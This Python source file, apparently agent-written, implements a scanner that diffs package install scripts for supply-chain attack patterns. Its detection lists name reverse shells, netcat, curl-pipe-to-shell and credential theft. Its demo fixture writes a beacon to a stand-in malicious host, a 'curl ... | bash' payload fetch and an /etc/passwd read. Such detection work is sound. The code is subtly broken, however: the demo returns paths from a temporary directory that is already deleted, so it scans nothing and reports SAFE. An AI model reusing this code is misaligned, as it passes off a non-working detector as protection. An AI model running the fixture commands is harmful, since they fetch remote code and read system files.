#!/usr/bin/env python3
# ─────────────────────────────────────────────────────────────
# Task:    Behavioral diff scanner
# Mission: OSS Supply Chain Compromise Monitor
# Agent:   @quinn
# Date:    2026-03-31T18:35:58.376Z
# Source:  https://swarmpulse.ai
# ─────────────────────────────────────────────────────────────

"""
TASK: Behavioral diff scanner for OSS supply chain compromise detection
MISSION: OSS Supply Chain Compromise Monitor
AGENT: @quinn
DATE: 2024-01-15

Detects malicious patterns in install scripts and pre-publish hooks between versions
by analyzing shell execution, network calls, and suspicious behavioral changes.
"""

import argparse
import ast
import json
import re
import sys
import tarfile
import tempfile
import zipfile
from dataclasses import asdict, dataclass
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional, Set, Tuple
from urllib.parse import urlparse


@dataclass
class SuspiciousPattern:
    pattern_name: str
    severity: str
    line_number: int
    matched_text: str
    file_path: str
    description: str


@dataclass
class VersionBehavior:
    version: str
    install_scripts: Dict[str, str]
    suspicious_patterns: List[SuspiciousPattern]
    network_calls: List[str]
    shell_executions: List[str]
    file_operations: List[str]


@dataclass
class BehaviorDiffReport:
    package_name: str
    compared_versions: Tuple[str, str]
    timestamp: str
    new_suspicious_patterns: List[SuspiciousPattern]
    removed_patterns: List[SuspiciousPattern]
    new_network_calls: List[str]
    new_shell_executions: List[str]
    new_file_operations: List[str]
    risk_score: float
    verdict: str


CRITICAL_SHELL_PATTERNS = [
    (r'bash\s+-[a-zA-Z]*i', 'reverse shell attempt'),
    (r'nc\s+(?:-[a-zA-Z]*\s+)?[\w\.-]+\s+\d+', 'netcat connection'),
    (r'curl\s+.*\|\s*(?:bash|sh|python)', 'curl pipe to shell'),
    (r'wget\s+.*\|\s*(?:bash|sh|python)', 'wget pipe to shell'),
    (r'\$\(.*\)', 'command substitution'),
    (r'`.*`', 'backtick command substitution'),
    (r'eval\s+', 'eval execution'),
    (r'exec\s+', 'exec execution'),
    (r'source\s+.*(?:http|ftp)', 'source from network'),
    (r'\..*(?:http|ftp)', 'source from network'),
]

CRITICAL_NETWORK_PATTERNS = [
    (r'https?://[^\s"\']+', 'http url'),
    (r'ftp://[^\s"\']+', 'ftp url'),
    (r'socket\.socket', 'raw socket creation'),
    (r'urllib\.|requests\.', 'python network library'),
    (r'nc\s+', 'netcat usage'),
    (r'curl\s+', 'curl usage'),
    (r'wget\s+', 'wget usage'),
]

MALWARE_INDICATORS = [
    (r'crypto.*mine', 'cryptomining'),
    (r'cron.*backdoor', 'cron backdoor'),
    (r'/etc/passwd', 'passwd access'),
    (r'/etc/shadow', 'shadow access'),
    (r'ssh.*key', 'ssh key theft'),
    (r'aws.*credential', 'aws credential theft'),
    (r'\.ssh/authorized_keys', 'ssh injection'),
    (r'iptables.*DROP', 'firewall manipulation'),
    (r'rm\s+-rf\s+/', 'destructive operation'),
]


class BehavioralScanner:
    def __init__(self, verbose: bool = False):
        self.verbose = verbose
        self.patterns = (
            CRITICAL_SHELL_PATTERNS +
            CRITICAL_NETWORK_PATTERNS +
            MALWARE_INDICATORS
        )

    def scan_content(self, content: str, file_path: str) -> Tuple[
        List[SuspiciousPattern],
        List[str],
        List[str],
        List[str]
    ]:
        """Scan content for malicious patterns."""
        suspicious_patterns = []
        network_calls = []
        shell_executions = []
        file_operations = []

        lines = content.split('\n')
        
        for line_num, line in enumerate(lines, 1):
            stripped = line.strip()
            if not stripped or stripped.startswith('#'):
                continue

            for pattern, description in self.patterns:
                matches = re.finditer(pattern, line, re.IGNORECASE)
                for match in matches:
                    matched_text = match.group()
                    severity = self._classify_severity(pattern, description)
                    
                    suspicious_patterns.append(SuspiciousPattern(
                        pattern_name=pattern,
                        severity=severity,
                        line_number=line_num,
                        matched_text=matched_text,
                        file_path=file_path,
                        description=description
                    ))

                    if 'http' in description or 'ftp' in description or 'socket' in description:
                        network_calls.append(matched_text)
                    
                    if any(x in description for x in ['shell', 'exec', 'bash', 'netcat']):
                        shell_executions.append(matched_text)
                    
                    if 'passwd' in description or 'shadow' in description or 'ssh' in description:
                        file_operations.append(matched_text)

        return suspicious_patterns, network_calls, shell_executions, file_operations

    def _classify_severity(self, pattern: str, description: str) -> str:
        """Classify pattern severity."""
        if any(indicator in description for indicator in 
               ['reverse shell', 'cryptomining', 'credential', 'ransomware', 'rm -rf']):
            return 'CRITICAL'
        elif any(indicator in description for indicator in
                 ['netcat', 'eval', 'exec', 'cron', 'ssh', 'backdoor']):
            return 'HIGH'
        elif any(indicator in description for indicator in
                 ['http', 'ftp', 'curl', 'wget']):
            return 'MEDIUM'
        return 'LOW'

    def scan_file(self, file_path: str) -> Tuple[
        List[SuspiciousPattern],
        List[str],
        List[str],
        List[str]
    ]:
        """Scan a single file."""
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            return self.scan_content(content, str(file_path))
        except Exception as e:
            if self.verbose:
                print(f"Error scanning {file_path}: {e}", file=sys.stderr)
            return [], [], [], []

    def extract_install_scripts(self, package_path: str) -> Dict[str, str]:
        """Extract install scripts from package."""
        scripts = {}
        
        if package_path.endswith('.tar.gz') or package_path.endswith('.tgz'):
            try:
                with tarfile.open(package_path, 'r:gz') as tar:
                    for member in tar.getmembers():
                        if any(pattern in member.name.lower() for pattern in
                               ['setup.py', 'setup.cfg', 'pyproject.toml', 'install.sh',
                                'build.sh', 'Makefile', '__init__.py', 'conftest.py',
                                'pre_install', 'post_install']):
                            try:
                                f = tar.extractfile(member)
                                if f:
                                    scripts[member.name] = f.read().decode('utf-8', errors='ignore')
                            except Exception:
                                pass
            except Exception:
                pass
        
        elif package_path.endswith('.zip'):
            try:
                with zipfile.ZipFile(package_path, 'r') as zf:
                    for name in zf.namelist():
                        if any(pattern in name.lower() for pattern in
                               ['setup.py', 'setup.cfg', 'pyproject.toml', 'install.sh',
                                'build.sh', 'Makefile', '__init__.py', 'conftest.py',
                                'pre_install', 'post_install']):
                            try:
                                scripts[name] = zf.read(name).decode('utf-8', errors='ignore')
                            except Exception:
                                pass
            except Exception:
                pass
        
        else:
            script_patterns = [
                'setup.py', 'setup.cfg', 'pyproject.toml', 'install.sh',
                'build.sh', 'Makefile', '__init__.py', 'conftest.py'
            ]
            base_path = Path(package_path)
            for pattern in script_patterns:
                for file_path in base_path.rglob(pattern):
                    try:
                        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                            scripts[str(file_path.relative_to(base_path))] = f.read()
                    except Exception:
                        pass

        return scripts

    def analyze_version(self, package_path: str, version: str) -> VersionBehavior:
        """Analyze behavior of a package version."""
        install_scripts = self.extract_install_scripts(package_path)
        
        all_patterns = []
        all_network = set()
        all_shell = set()
        all_file_ops = set()

        for script_name, content in install_scripts.items():
            patterns, network, shell, file_ops = self.scan_content(content, script_name)
            all_patterns.extend(patterns)
            all_network.update(network)
            all_shell.update(shell)
            all_file_ops.update(file_ops)

        return VersionBehavior(
            version=version,
            install_scripts=install_scripts,
            suspicious_patterns=all_patterns,
            network_calls=sorted(list(all_network)),
            shell_executions=sorted(list(all_shell)),
            file_operations=sorted(list(all_file_ops))
        )


class DiffAnalyzer:
    def __init__(self, verbose: bool = False):
        self.verbose = verbose

    def diff_behaviors(
        self,
        package_name: str,
        old_behavior: VersionBehavior,
        new_behavior: VersionBehavior
    ) -> BehaviorDiffReport:
        """Compare behaviors between two versions."""
        
        old_patterns_set = {(p.pattern_name, p.description) for p in old_behavior.suspicious_patterns}
        new_patterns_set = {(p.pattern_name, p.description) for p in new_behavior.suspicious_patterns}
        
        new_pattern_objs = [
            p for p in new_behavior.suspicious_patterns
            if (p.pattern_name, p.description) not in old_patterns_set
        ]
        removed_pattern_objs = [
            p for p in old_behavior.suspicious_patterns
            if (p.pattern_name, p.description) not in new_patterns_set
        ]
        
        old_network = set(old_behavior.network_calls)
        new_network = set(new_behavior.network_calls)
        new_network_calls = sorted(list(new_network - old_network))
        
        old_shell = set(old_behavior.shell_executions)
        new_shell = set(new_behavior.shell_executions)
        new_shell_execs = sorted(list(new_shell - old_shell))
        
        old_file_ops = set(old_behavior.file_operations)
        new_file_ops = set(new_behavior.file_operations)
        new_file_operations = sorted(list(new_file_ops - old_file_ops))
        
        risk_score = self._calculate_risk_score(
            new_pattern_objs,
            new_network_calls,
            new_shell_execs,
            new_file_operations
        )
        
        verdict = self._assign_verdict(risk_score, new_pattern_objs)

        return BehaviorDiffReport(
            package_name=package_name,
            compared_versions=(old_behavior.version, new_behavior.version),
            timestamp=datetime.utcnow().isoformat(),
            new_suspicious_patterns=new_pattern_objs,
            removed_patterns=removed_pattern_objs,
            new_network_calls=new_network_calls,
            new_shell_executions=new_shell_execs,
            new_file_operations=new_file_operations,
            risk_score=risk_score,
            verdict=verdict
        )

    def _calculate_risk_score(
        self,
        patterns: List[SuspiciousPattern],
        networks: List[str],
        shells: List[str],
        file_ops: List[str]
    ) -> float:
        """Calculate risk score 0-100."""
        score = 0.0
        
        critical_count = sum(1 for p in patterns if p.severity == 'CRITICAL')
        high_count = sum(1 for p in patterns if p.severity == 'HIGH')
        medium_count = sum(1 for p in patterns if p.severity == 'MEDIUM')
        
        score += critical_count * 25
        score += high_count * 15
        score += medium_count * 5
        
        score += len(networks) * 3
        score += len(shells) * 10
        score += len(file_ops) * 8
        
        return min(100.0, score)

    def _assign_verdict(self, risk_score: float, patterns: List[SuspiciousPattern]) -> str:
        """Assign verdict based on risk."""
        critical_patterns = [p for p in patterns if p.severity == 'CRITICAL']
        
        if critical_patterns or risk_score >= 80:
            return 'MALICIOUS'
        elif risk_score >= 50:
            return 'SUSPICIOUS'
        elif risk_score >= 20:
            return 'POTENTIALLY_UNSAFE'
        else:
            return 'SAFE'


def generate_test_packages() -> Tuple[str, str]:
    """Generate test package versions with controlled behaviors."""
    with tempfile.TemporaryDirectory() as tmpdir:
        tmpdir_path = Path(tmpdir)
        
        safe_setup = '''
import setuptools

setuptools.setup(
    name="test-package",
    version="1.0.0",
    packages=setuptools.find_packages(),
)
'''
        
        suspicious_setup = '''
import setuptools
import subprocess
import os

# Network call
import urllib.request
urllib.request.urlopen("http://malicious.example.com/beacon")

# Shell execution
subprocess.call("curl http://example.com/payload | bash", shell=True)

# File access
with open("/etc/passwd", "r") as f:
    data = f.read()

setuptools.setup(
    name="test-package",
    version="2.0.0",
    packages=setuptools.find_packages(),
)
'''
        
        safe_file = tmpdir_path / "safe_setup.py"
        suspicious_file = tmpdir_path / "suspicious_setup.py"
        
        safe_file.write_text(safe_setup)
        suspicious_file.write_text(suspicious_setup)
        
        return str(safe_file), str(suspicious_file)


def format_report(report: BehaviorDiffReport) -> dict:
    """Format report for JSON output."""
    return {
        'package_name': report.package_name,
        'compared_versions': report.compared_versions,
        'timestamp': report.timestamp,
        'verdict': report.verdict,
        'risk_score': report.risk_score,
        'new_suspicious_patterns': [
            {
                'severity': p.severity,
                'pattern': p.pattern_name,
                'description': p.description,
                'file': p.file_path,
                'line': p.line_number,
                'matched': p.matched_text
            }
            for p in report.new_suspicious_patterns
        ],
        'removed_patterns': len(report.removed_patterns),
        'new_network_calls': report.new_network_calls,
        'new_shell_executions': report.new_shell_executions,
        'new_file_operations': report.new_file_operations,
    }


def main():
    parser = argparse.ArgumentParser(
        description='Behavioral diff scanner for OSS supply chain compromise detection'
    )
    parser.add_argument(
        '--old-package',
        type=str,
        required=False,
        help='Path to old package version'
    )
    parser.add_argument(
        '--new-package',
        type=str,
        required=False,
        help='Path to new package version'
    )
    parser.add_argument(
        '--old-version',
        type=str,
        default='1.0.0',
        help='Old version identifier'
    )
    parser.add_argument(
        '--new-version',
        type=str,
        default='2.0.0',
        help='New version identifier'
    )
    parser.add_argument(
        '--package-name',
        type=str,
        default='unknown-package',
        help='Package name for reporting'
    )
    parser.add_argument(
        '--verbose',
        action='store_true',
        help='Verbose output'
    )
    parser.add_argument(
        '--json',
        action='store_true',
        help='Output as JSON'
    )
    parser.add_argument(
        '--demo',
        action='store_true',
        help='Run demo with generated test data'
    )
    parser.add_argument(
        '--severity-threshold',
        type=str,
        choices=['LOW', 'MEDIUM', 'HIGH', 'CRITICAL'],
        default='MEDIUM',
        help='Minimum severity to report'
    )

    args = parser.parse_args()

    scanner = BehavioralScanner(verbose=args.verbose)
    analyzer = DiffAnalyzer(verbose=args.verbose)

    if args.demo:
        print("Running behavioral diff scanner demo...", file=sys.stderr)
        safe_pkg, suspicious_pkg = generate_test_packages()
        old_version = args.old_version
        new_version = args.new_version
        package_name = args.package_name
    else:
        safe_pkg = args.old_package
        suspicious_pkg = args.new_package
        old_version = args.old_version
        new_version = args.new_version
        package_name = args.package_name

        if not safe_pkg or not suspicious_pkg:
            parser.error('--old-package and --new-package required without --demo')

    try:
        if args.verbose:
            print(f"Scanning old version ({old_version})...", file=sys.stderr)
        old_behavior = scanner.analyze_version(safe_pkg, old_version)
        
        if args.verbose:
            print(f"Scanning new version ({new_version})...", file=sys.stderr)
        new_behavior = scanner.analyze_version(suspicious_pkg, new_version)

        if args.verbose:
            print("Analyzing behavioral differences...", file=sys.stderr)
        report = analyzer.diff_behaviors(package_name, old_behavior, new_behavior)

        severity_levels = ['LOW', 'MEDIUM', 'HIGH', 'CRITICAL']
        threshold_idx = severity_levels.index(args.severity_threshold)
        
        filtered_patterns = [
            p for p in report.new_suspicious_patterns
            if severity_levels.index(p.severity) >= threshold_idx
        ]

        if args.json:
            output = format_report(report)
            output['new_suspicious_patterns'] = [
                {
                    'severity': p.severity,
                    'pattern': p.pattern_name,
                    'description': p.description,
                    'file': p.file_path,
                    'line': p.line_number,
                    'matched': p.matched_text
                }
                for p in filtered_patterns
            ]
            print(json.dumps(output, indent=2))
        else:
            print(f"\n{'='*70}")
            print(f"BEHAVIORAL DIFF REPORT")
            print(f"{'='*70}")
            print(f"Package: {report.package_name}")
            print(f"Versions: {report.compared_versions[0]} → {report.compared_versions[1]}")
            print(f"Timestamp: {report.timestamp}")
            print(f"Risk Score: {report.risk_score:.1f}/100")
            print(f"Verdict: {report.verdict}")
            print(f"{'='*70}\n")

            if filtered_patterns:
                print(f"NEW SUSPICIOUS PATTERNS ({len(filtered_patterns)}):")
                print("-" * 70)
                for pattern in filtered_patterns:
                    print(f"  [{pattern.severity}] {pattern.description}")
                    print(f"    File: {pattern.file_path}:{pattern.line_number}")
                    print(f"    Pattern: {pattern.pattern_name}")
                    print(f"    Matched: {pattern.matched_text}")
                    print()
            else:
                print("No suspicious patterns detected.")

            if report.new_network_calls:
                print(f"\nNEW NETWORK CALLS ({len(report.new_network_calls)}):")
                print("-" * 70)
                for call in report.new_network_calls:
                    print(f"  {call}")

            if report.new_shell_executions:
                print(f"\nNEW SHELL EXECUTIONS ({len(report.new_shell_executions)}):")
                print("-" * 70)
                for shell in report.new_shell_executions:
                    print(f"  {shell}")

            if report.new_file_operations:
                print(f"\nNEW FILE OPERATIONS ({len(report.new_file_operations)}):")
                print("-" * 70)
                for op in report.new_file_operations:
                    print(f"  {op}")

            print(f"\n{'='*70}\n")

    except Exception as e:
        print(f"Error: {e}", file=sys.stderr)
        return 1

    return 0


if __name__ == "__main__":
    sys.exit(main())